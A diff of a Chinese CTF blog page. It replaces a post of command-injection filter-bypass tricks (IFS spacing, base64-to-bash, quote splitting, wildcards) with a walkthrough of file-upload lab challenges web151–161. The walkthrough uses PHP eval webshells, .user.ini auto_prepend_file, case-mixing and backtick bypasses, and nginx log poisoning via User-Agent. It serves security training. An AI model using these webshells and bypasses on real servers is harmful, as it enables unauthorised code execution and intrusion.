@@ -16,21 +16,33 @@
   <meta name="author" content="奇怪的奇怪">
   <meta name="keywords" content="">
   
-    <meta name="description" content="管道符windows 下：  | 直接执行后面的语句 || 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句 &amp; 前面和后面命令都要执行，无论前面真假 &amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令   Linux 下：  ; 前面和后面命令都要执行，无论前面真假 | 直接执行后面的语句 || 如果前面命令是错的那么就执行后面的语句，否则只执">
+    <meta name="description" content="web151首先创建一个记事本,内容为&lt;?php eval($_POST[&#39;a&#39;]);?&gt;然后修改文件后缀为png，因为题目要求上传一个图片文件，上传时使用burpsuite进行抓包，在burpsuit上修改将后缀名改为php文件上传成功后，会给你你刚才上传的路径在url中输入以进入路径，然后复制网址使用中国蚁剑进入文件查询获取flag web152同上，一模一样 we">
 <meta property="og:type" content="article">
-<meta property="og:title" content="命令执行绕过小技巧">
-<meta property="og:url" content="http://example.com/2023/04/19/minlinzhixinraoguo/index.html">
+<meta property="og:title" content="web入门:文件上传">
+<meta property="og:url" content="http://example.com/2023/05/25/wenjianshangchuan/index.html">
 <meta property="og:site_name" content="奇怪的亚索">
-<meta property="og:description" content="管道符windows 下：  | 直接执行后面的语句 || 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句 &amp; 前面和后面命令都要执行，无论前面真假 &amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令   Linux 下：  ; 前面和后面命令都要执行，无论前面真假 | 直接执行后面的语句 || 如果前面命令是错的那么就执行后面的语句，否则只执">
+<meta property="og:description" content="web151首先创建一个记事本,内容为&lt;?php eval($_POST[&#39;a&#39;]);?&gt;然后修改文件后缀为png，因为题目要求上传一个图片文件，上传时使用burpsuite进行抓包，在burpsuit上修改将后缀名改为php文件上传成功后，会给你你刚才上传的路径在url中输入以进入路径，然后复制网址使用中国蚁剑进入文件查询获取flag web152同上，一模一样 we">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-04-18T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-04-19T12:45:08.620Z">
+<meta property="og:image" content="http://example.com/images/Y8.png">
+<meta property="og:image" content="http://example.com/images/79.png">
+<meta property="og:image" content="http://example.com/images/6h.png">
+<meta property="og:image" content="http://example.com/images/87.png">
+<meta property="og:image" content="http://example.com/images/V2.png">
+<meta property="og:image" content="http://example.com/images/2b.png">
+<meta property="og:image" content="http://example.com/images/IP.png">
+<meta property="og:image" content="http://example.com/images/6CQ02C.png">
+<meta property="og:image" content="http://example.com/images/OHK.png">
+<meta property="og:image" content="http://example.com/images/0XC3.png">
+<meta property="og:image" content="http://example.com/images/KAO6J.png">
+<meta property="article:published_time" content="2023-05-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-05-25T14:22:39.934Z">
 <meta property="article:author" content="奇怪的奇怪">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/Y8.png">
   
   
   
-  <title>命令执行绕过小技巧 - 奇怪的亚索</title>
+  <title>web入门:文件上传 - 奇怪的亚索</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -213,7 +225,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="命令执行绕过小技巧"></span>
+            <span id="subtitle" data-typed-text="web入门:文件上传"></span>
           
         </div>
 
@@ -224,8 +236,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-04-19 00:00" pubdate>
-          2023年4月19日 凌晨
+        <time datetime="2023-05-25 00:00" pubdate>
+          2023年5月25日 凌晨
         </time>
       </span>
     
@@ -236,7 +248,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k 字
+          2.1k 字
         
       </span>
     
@@ -247,7 +259,7 @@
         
         
         
-          10 分钟
+          18 分钟
         
       </span>
     
@@ -293,83 +305,39 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">命令执行绕过小技巧</h1>
+            <h1 style="display: none">web入门:文件上传</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><h4 id="windows-下："><a href="#windows-下：" class="headerlink" title="windows 下："></a>windows 下：</h4><blockquote>
-<ul>
-<li><strong>|</strong> 直接执行后面的语句</li>
-<li><strong>||</strong> 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</li>
-<li><strong>&amp;</strong> 前面和后面命令都要执行，无论前面真假</li>
-<li><strong>&amp;&amp;</strong> 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</li>
-</ul>
-</blockquote>
-<h4 id="Linux-下："><a href="#Linux-下：" class="headerlink" title="Linux 下："></a>Linux 下：</h4><blockquote>
-<ul>
-<li><strong>;</strong> 前面和后面命令都要执行，无论前面真假</li>
-<li><strong>|</strong> 直接执行后面的语句</li>
-<li><strong>||</strong> 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</li>
-<li><strong>&amp;</strong> 前面和后面命令都要执行，无论前面真假</li>
-<li><strong>&amp;&amp;</strong> 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</li>
-</ul>
-</blockquote>
-<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><ul>
-<li><strong>&gt;</strong> &lt; &lt;&gt; 重定向符</li>
-<li>%09(需要php环境)</li>
-<li>${IFS}</li>
-<li>$IFS$9</li>
-<li>{cat,flag.php} &#x2F;&#x2F;用逗号实现了空格功能</li>
-<li>%20</li>
-<li>%09</li>
-</ul>
-<h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><blockquote>
-<ul>
-<li>system()</li>
-<li>passthru()</li>
-<li>exec()</li>
-<li>shell_exec()</li>
-<li>popen()</li>
-<li>proc_open()</li>
-<li>pcntl_exec()</li>
-<li>反引号 同shell_exec()</li>
-</ul>
-</blockquote>
-<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h4 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h4><blockquote>
-<p>a&#x3D;c;b&#x3D;at;c&#x3D;fl;d&#x3D;ag;$a$b $c$d</p>
-</blockquote>
-<h4 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h4><blockquote>
-<p>echo “Y2F0IGZsYWc&#x3D;”|base64 -d<br>echo “Y2F0IGZsYWc&#x3D;”|base64 -d|bash (在bash被过滤的情况下可尝试sh)</p>
-</blockquote>
-<h4 id="单引号、双引号"><a href="#单引号、双引号" class="headerlink" title="单引号、双引号"></a>单引号、双引号</h4><blockquote>
-<p>c””at fl’’ag</p>
-</blockquote>
-<h4 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h4><blockquote>
-<p>c\at fl\ag</p>
-</blockquote>
-<h4 id="正则-假设-x2F-bin-x2F-cat-test-是一个目录"><a href="#正则-假设-x2F-bin-x2F-cat-test-是一个目录" class="headerlink" title="正则 (假设&#x2F;bin&#x2F;cat: test: 是一个目录)"></a>正则 (假设&#x2F;bin&#x2F;cat: test: 是一个目录)</h4><blockquote>
-<p>&#x2F;???&#x2F;?[a][t] ?’’?’’?’’?’’<br>&#x2F;???&#x2F;?at ????<br>&#x2F;???&#x2F;?[a]’’[t] ?’’?’’?’’?’’</p>
-</blockquote>
-<h4 id="1、-2等和"><a href="#1、-2等和" class="headerlink" title="$1、$2等和$@"></a>$1、$2等和$@</h4><blockquote>
-<ul>
-<li>$# 是传给脚本的参数个数</li>
-<li>$0 是脚本本身的名字</li>
-<li>$1 是传递给该shell脚本的第一个参数</li>
-<li>$2 是传递给该shell脚本的第二个参数</li>
-<li>$@ 是传给脚本的所有参数的列表</li>
-<li>$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</li>
-<li>$$ 是脚本运行的当前进程ID号</li>
-<li>$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</li>
-</ul>
-</blockquote>
-<h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><blockquote>
-<p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容</p>
-</blockquote>
-<h2 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h2><blockquote>
-<p>cat$IFS$9<code>ls</code><br>cat$IFS$9$(ls)</p>
-</blockquote>
-<p>(内联，就是将&#96;&#96;或$()内命令的输出作为输入执行)</p>
+                <h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>首先创建一个记事本,内容为<code>&lt;?php eval($_POST[&#39;a&#39;]);?&gt;</code><br>然后修改文件后缀为png，因为题目要求上传一个图片文件，上传时使用burpsuite进行抓包，在burpsuit上修改将后缀名改为php<br><img src="/images/Y8.png" srcset="/img/loading.gif" lazyload><br>文件上传成功后，会给你你刚才上传的路径<br><img src="/images/79.png" srcset="/img/loading.gif" lazyload><br>在url中输入以进入路径，然后复制网址<br><img src="/images/6h.png" srcset="/img/loading.gif" lazyload><br>使用中国蚁剑进入文件查询<br><img src="/images/87.png" srcset="/img/loading.gif" lazyload><br>获取flag</p>
+<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>同上，一模一样</p>
+<h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p>这题不能通过该burpsuite中文件的后缀来获取flag</p>
+<p>首先我们上传一个.user.ini文件，内容如下，我们可以先改为png后缀再抓包，修改，再上传</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=1.png<br></code></pre></td></tr></table></figure>
+
+<p>然后我们再上传1.png<br>内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>然后我们可以用中国蚁剑连接，连接后缀为&#x2F;upload&#x2F;index.php<br>还可以这样做<br>先检查木马是否上传完毕<br><img src="/images/V2.png" srcset="/img/loading.gif" lazyload><br>在index.php进行命令执行成功，说明我们的木马上传成功<br>ls发现并没有flag<br><img src="/images/2b.png" srcset="/img/loading.gif" lazyload><br>我们返回上一级试试<br><img src="/images/IP.png" srcset="/img/loading.gif" lazyload><br>成功发现flag<br>再次post</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>system(<span class="hljs-string">&quot;cat ../flag.php&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>查看源码发现flag</p>
+<h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><p>首先写好一个.user.ini文件<br>内容为auto_prepend_file&#x3D;1.pHp<br><strong>注：本题过滤了php，因此使用大小写混写可以跳过</strong><br>把.user.ini文件添加png后缀以成功提交<br>在提交时开启burpsuite 抓包<br><img src="/images/6CQ02C.png" srcset="/img/loading.gif" lazyload><br>删除.png后缀<br><img src="/images/OHK.png" srcset="/img/loading.gif" lazyload><br>成功提交<br>再写一个1.pHp文件<br>内容为<?pHp eval($_POST['a']);?><br>同样的php要大小写混用<br>把1.pHp后缀改为1.png<br>上传，抓包，把后缀.png改为.pHp<br><img src="/images/0XC3.png" srcset="/img/loading.gif" lazyload><br>成功上传<br>接下来我们打开中国蚁剑<br><img src="/images/KAO6J.png" srcset="/img/loading.gif" lazyload><br>成功连接<br>在&#x2F;var&#x2F;www&#x2F;html&#x2F;中找到flag.php<br>✌️</p>
+<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>先上传.user.ini.png文件<br>内容为auto_prepend_file&#x3D;1.png<br><strong>注：本题过滤了php</strong><br>提交时开启burpsuite 抓包<br>删除.png后缀<br>成功提交<br>再写一个1.png文件<br>内容为<?= eval($POST['a']);?><br>直接提交<br>这样写虽然能成功连接中国蚁剑但是不能访问，所以<br>进入&#x2F;upload&#x2F;index.php路径<br>hackbar中post提交a&#x3D;system(“cat ..&#x2F;flag.php”);<br>打开源码即可看到flag</p>
+<p>2<br>虽然本题过滤了php，但可以用txt<br>上传.user.ini.png文件<br>内容为auto_prepend_file&#x3D;1.txt<br>抓包，删除.png后缀<br>成功提交<br>写一个1.png文件<br>内容同上<br>抓包将png后缀改为.txt<br>上传成功<br>这样就能在中国蚁剑上访问了<br>同样的flag在&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下</p>
+<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>上传1.png文件 内容为 <code>&lt;?= eval($_POST&#123;&#39;a&#39;&#125;);?&gt;</code><br>在burpsuite里改为1.txt<br>这题过滤了php还有[]，所以[]用{}代替<br>接下来就和上一题一样了<br>上传一个.user.ini.png<br>内容为auto_prepend_file&#x3D;1.txt<br>抓包后改为.user.ini<br>进入&#x2F;upload&#x2F;index.php 打开蚁剑，成功连接，找到flag<br>也可以在post里输入a&#x3D;system(“cat ..&#x2F;flag.php”);<br>找到flag</p>
+<h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><p>本题又添加过滤了;<br>我们可以把语句用括号()包含，<br>1.png<br>内容：&#96;&#96;&#96;<?=(system("cat ../fla*"))?></p>
+<p>.user.ini<br>内容：&#96;&#96;&#96;auto_prepend_file&#x3D;1.png</p>
+<p>上传这两个后进入&#x2F;upload查看flag</p>
+<h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>同157题</p>
+<h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>本题又过滤了括号，我们可以用反引号代替括号<br>1.png<br>内容：&#96;&#96;&#96;<?= `cat ../fla*`?></p>
+<p>.user.ini<br>内容：&#96;&#96;&#96;auto_prepend_file&#x3D;1.png</p>
+<p>上传后进入&#x2F;upload查看flag</p>
+<h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>本题添加了日志包含，nginx的日志在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log，过滤了log，用.拼接<br>include”&#x2F;var&#x2F;lo”.”g&#x2F;nginx&#x2F;access.lo”.”g”</p>
+<p>首先先上传.user.ini<br>内容：auto_prepend_file&#x3D;1.png</p>
+<p>再上传1.png<br>内容：<?=include"/var/lo"."g/nginx/access.lo"."g"?></p>
+<p>进入&#x2F;uoload 发现日志包含ua头,我们在ua头写cat语句<br>User-Agent:<?=`cat ../fla*`?><br>成功显示flag</p>
+<h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>本题较上一题添加了绕过PHP函数getimagesize()检测文件头，老套路，上传的文件首行都加一个GIF89A,其余操作同160题</p>
 
                 
               </div>
@@ -387,8 +355,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>命令执行绕过小技巧</div>
-      <div>http://example.com/2023/04/19/minlinzhixinraoguo/</div>
+      <div>web入门:文件上传</div>
+      <div>http://example.com/2023/05/25/wenjianshangchuan/</div>
     </div>
     <div class="license-meta">
       
@@ -400,7 +368,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年4月19日</div>
+          <div>2023年5月25日</div>
         </div>
       
       
@@ -432,18 +400,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/04/24/minlinzhixin/" title="web入门:命令执行🫠">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">web入门:命令执行🫠</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/04/19/my-blogneirong/" title="每周报告">
-                        <span class="hidden-mobile">每周报告</span>
+                      <a href="/2023/05/23/ctfweb/" title="ctf_web">
+                        <span class="hidden-mobile">ctf_web</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
